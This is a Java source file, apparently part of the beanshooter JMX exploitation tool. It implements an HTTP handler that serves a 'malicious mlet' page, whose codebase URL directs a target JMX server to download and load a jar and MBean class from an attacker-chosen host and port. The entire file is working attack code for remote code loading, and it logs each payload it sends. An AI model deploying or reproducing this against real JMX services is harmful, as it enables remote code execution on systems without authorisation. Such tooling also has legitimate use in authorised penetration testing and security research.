package de.qtc.beanshooter;

import java.io.IOException;
import java.io.OutputStream;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;


public class MLetHandler implements HttpHandler {

    String host = null;
    String port = null;
    String jarName = null;
    String mBeanClass = null;
    String objectName = null;

    public MLetHandler(String host, String port, String beanClass, String jarName, String objectName) 
    {
        this.host = host;
        this.port = port;
        this.jarName = jarName;
        this.mBeanClass = beanClass;
        this.objectName = objectName;
    }

    public void handle(HttpExchange t) throws IOException 
    {
        System.out.println("[+] \tReceived request for /mlet");

        String response = "<HTML><mlet code=\"%s\" archive=\"%s\" name=\"%s\" codebase=\"http://%s:%s\"></mlet></HTML>";
        response = String.format(response, this.mBeanClass, this.jarName, this.objectName, this.host, this.port);

        System.out.println("[+] \tSending malicious mlet:\n[+]");
        System.out.println("[+] \t\tClass:\t\t" + this.mBeanClass);
        System.out.println("[+] \t\tArchive:\t" + this.jarName);
        System.out.println("[+] \t\tObject:\t\t" + this.objectName);
        System.out.println("[+] \t\tCodebase:\thttp://" + this.host + ":" + this.port + "\n[+]");

        t.sendResponseHeaders(200, response.length());
        OutputStream os = t.getResponseBody();
        os.write(response.getBytes());
        os.close();
    }
}